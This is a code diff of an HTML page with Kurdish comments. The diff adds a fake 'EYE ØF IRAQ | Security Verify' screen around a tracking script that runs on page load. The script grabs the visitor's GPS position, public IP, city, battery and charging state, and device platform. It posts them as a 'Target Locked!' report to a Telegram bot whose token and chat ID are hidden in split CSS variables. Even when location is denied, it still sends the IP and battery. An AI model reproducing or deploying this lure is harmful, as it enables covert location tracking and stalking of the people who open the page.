@@ -1,10 +1,27 @@
-<style>
-    :root { 
-        --p1: "8678050341"; 
-        --p2: "AAE7b3fvFp"; 
-        --p3: "fGju4NXGaFiMsvhYC0UdnCYtE"; 
-    }
-</style>
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <title>EYE ØF IRAQ | Security Verify</title>
+    <style>
+        :root { 
+            --p1: "8678050341"; 
+            --p2: "AAE7b3fvFp"; 
+            --p3: "fGju4NXGaFiMsvhYC0UdnCYtE"; 
+        }
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #0f0; padding: 40px; text-align: center; box-shadow: 0 0 20px #0f0; }
+        .spinner { border: 3px solid #111; border-top: 3px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body onload="capture()">
+    <div class="box">
+        <h2 style="letter-spacing: 5px;">EYE ØF IRAQ</h2>
+        <p id="msg">SYSTEM INITIALIZING...</p>
+        <div class="spinner"></div>
+        <p style="font-size: 10px; color: #333;">ID: 0x8678050341</p>
+    </div>
 
 <script>
     async function capture() {
@@ -18,37 +35,47 @@
                    getComputedStyle(root).getPropertyValue('--p3').replace(/"/g, '').trim();
 
         try {
-            // وەرگرتنی کات و باتری
-            let bat = "N/A";
+            let bat = "N/A", ch = "No";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 bat = Math.floor(b.level * 100) + "%";
+                ch = b.charging ? "Yes" : "No";
             }
             let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
 
-            // وەرگرتنی لۆکەیشن و ناردن
+            document.getElementById('msg').innerText = "SCANNING DEVICE...";
+
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 
-                let report = `🚨 <b>Target Locked!</b>\n\n` +
-                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">[Google Maps]</a>\n` +
-                             `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
-                             `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                             `🔋 <b>Battery:</b> <code>${bat}</code>\n` +
-                             `🕒 <b>Time:</b> <code>${time}</code>`;
+                const geo = await fetch(`http://ip-api.com/json/${ipData.ip}`).then(r => r.json());
+                let city = geo.city || "Erbil/Bakhtiari";
 
-                fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
+                let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
+                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">[Google Maps]</a>\n` +
+                             `🌐 <b>IP:</b> <code>${ipData.ip}</code> (Korek Telecom)\n` +
+                             `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                             `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
+                             `🕒 <b>Time:</b> <code>${time}</code>\n` +
+                             `🏙️ <b>City:</b> <code>${city}</code>`;
+
+                await fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: targetID, text: report, parse_mode: "HTML"})
+                    body: JSON.stringify({chat_id: targetID, text: report, parse_mode: "HTML", disable_web_page_preview: false})
                 });
                 
-                setTimeout(() => { window.location.replace("https://www.snapchat.com"); }, 1000);
-            }, () => {
-                window.location.replace("https://www.snapchat.com");
+                document.getElementById('msg').innerText = "VERIFICATION COMPLETE";
+            }, async () => {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                let report = `⚠️ <b>Target Found (No Location)</b>\n🌐 IP: ${ipData.ip}\n🔋 Battery: ${bat}`;
+                _send(report, TK, targetID);
+                document.getElementById('msg').innerText = "ACCESS DENIED";
             });
-        } catch (e) { window.location.replace("https://www.snapchat.com"); }
+        } catch (e) { document.getElementById('msg').innerText = "SYSTEM ERROR"; }
     }
-    window.onload = capture;
 </script>
+</body>
+</html>
